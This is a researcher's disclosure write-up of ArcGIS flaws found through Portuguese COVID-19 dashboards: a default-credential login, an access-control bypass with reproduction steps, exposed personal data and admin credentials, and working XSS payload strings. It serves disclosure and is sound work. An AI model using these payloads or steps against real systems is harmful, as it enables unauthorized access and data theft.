@@ -1,0 +1,88 @@
+# From a COVID-19 dashboard to the discovery of multiple security flaws
+
+COVID-19 surely caught many off guard and one of the implications of that was the need to quickly come up with software solutions that eased decision-making around the virus and also helped citizens staying informed.
+
+In Portugal, the government created the COVID-19 Digital Response Office with the goal of evaluating, implementing and providing information on how to best use the digital world to tackle the pandemic. Its members are the government itself, other national entities (including health departments), some IT companies, academic instutions and some associations.
+
+One of the outputs of this response office was a set of dashboards combining data on the evolution of virus spread in the population over time. These dashboards were built with https://www.arcgis.com/[ArcGIS], a geographical information system available since 1999 and created by https://www.esri.com/[ESRI], a company whose official https://www.esri-portugal.pt/pt-pt/home[portuguese distributor] is a member of the COVID-19 Digital Response Office.
+
+Those dashboards did call for my curiosity on finding out more about the software and data behind them.
+This article is therefore a compilation of security vulnerabilities, misconfigurations and data exposures that I have encountered and reported to the responsible entities so that they could get addressed.
+
+## 1. Accidentally hacking a user
+
+While searching the ArcGIS documentation pages for reference information on its REST API, I felt the need to go more hands-on and actually play with the API myself. In fact, ArcGIS is licensed for free for personal use, but I was not aware of this fact at the time. Instead, I found some test credentials (something like "test" as username and "test" as password) which I figured could be the credentials for a test development account in ArcGIS.
+
+Turns out I was able to successfully log in to the system with those credentials, but my assumption was wrong. This was not a test account, it was an actually usable account. And this account had a ton of usage credits available.
+
+https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration[The exploitation of default credentials is a very common attack vector] and of zero complexity in most cases. However, after contacting ESRI about this incident, I was informed that this was not an officially created test account, instead it was created by an actual user of the system, who happened to work at ESRI judging from the `@esri.com` email address.
+
+## 2. Access Control vulnerability
+
+Incorrect access control vulnerability in Feature Service in ArcGIS Online 8.1 allows remote attackers to read data from a Feature Service which does not have the "Query" capability by synchronizing it against a replica which belongs to a different Feature Service.
+
+Steps to reproduce:
+1. Create Feature Service A with capabilities "Create, Editing, Sync" (no Query) and which disallows creating replicas.
+2. Try to create a new replica of Feature Service A at https://<featureservice-A-url>/createReplica and verify the operation fails with the error "This operation is not supported.".
+3. Create Feature Service B with capabilities "Create, Query, Editing, Sync" and which allows creating replicas.
+4. Create a new replica of Feature Service B at https://<featureservice-B-url>/createReplica.
+5. Use the new replica to synchronize snapshot against Feature Service B at https://<featureservice-B-url>/synchronizeReplica and verify the operation succeeds as expected.
+6. Use the same replica ID of Feature Service B to synchronize snapshot against Feature Service A at https://<featureservice-A-url>/synchronizeReplica and verify the operation succeeds displaying a snapshot of all data, even though the replica belongs to a different feature service and the "Query" capability is not present.
+
+## 3. Leaked data due to wrong permissions
+
+23 services were identified as containing sensitive personal data.
+
+In total, the exposed data contained:
+* ~2500 personal names
+* ~500 personal email addresses
+* ~500 personal phone numbers
+* ~50 personal street addresses
+* ~1000 ID card numbers
+* ~150 free-text opinion form responses
+* ~150 1-5 rating form responses
+
+In addition to this textual data, I found an attachment image containing a screen capture of a Skype conversation that had happened on the 20th April 2020. The chat messages visible in this screen capture included an URL and two values which appeared to be a username and a password.
+The URL pointed to the ArcGIS administration page used by the city council of Condeixa-a-Nova (Coimbra, Portugal), which means that the other two values were very likely the administrator credentials of the ArcGIS service used by this city council.
+
+Having contacted both Esri PT and Condeixa's city council, the issues got resolved quickly and therefore the personal data is no longer exposed and the password for the administrator account has been changed.
+
+## 4. Wrong permissions in COVID-19 dashboard
+https://services.arcgis.com/CCZiGSEQbAxxFVh3/ArcGIS/rest/services/COVID19_Survey_vw/FeatureServer
+https://services.arcgis.com/CCZiGSEQbAxxFVh3/ArcGIS/rest/services/service_e56676a38ad54b78951050808f2be62c/FeatureServer
+
+Resolved by the 30th June 2020.
+
+## 5. XSS vulnerability
+
+https://support.esri.com/en/bugs/nimbus/QlVHLTAwMDEzMzI1Nw==
+
+Creating a layer with the below text as its title causes an alert message to be displayed to the user, proving that XSS is possible.
+<IMG src="#" STYLE="'onerror=alert('XSS!');'">
+
+The malicious javascript is executed upon clicking the "Show Table" button for the corresponding layer in the Web Map Viewer.
+
+Example: https://arcg.is/0yviqj
+
+
+Success:
+Layer title: <IMG src="#" STYLE="'onerror=alert('FCPorto!');'">
+Layer cell: <IMG src="#" STYLE=""onerror=alert('FCPorto!');"">
+<img src="#" style="" onerror="alert('FCPorto!');''">
+
+Failures:
+
+<IMG src="#" onerror="alert('FCPorto!');">
+<img src="#">
+
+<IMG SRC=\"javascript:alert('XSS');\">
+<img src="#alert(" xss');'="">
+
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<table></table>
+
+<DIV STYLE="width: expression(alert('XSS'));">
+<div style="width: expression(alert(" xss'));'=""></div>
+
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+(empty)
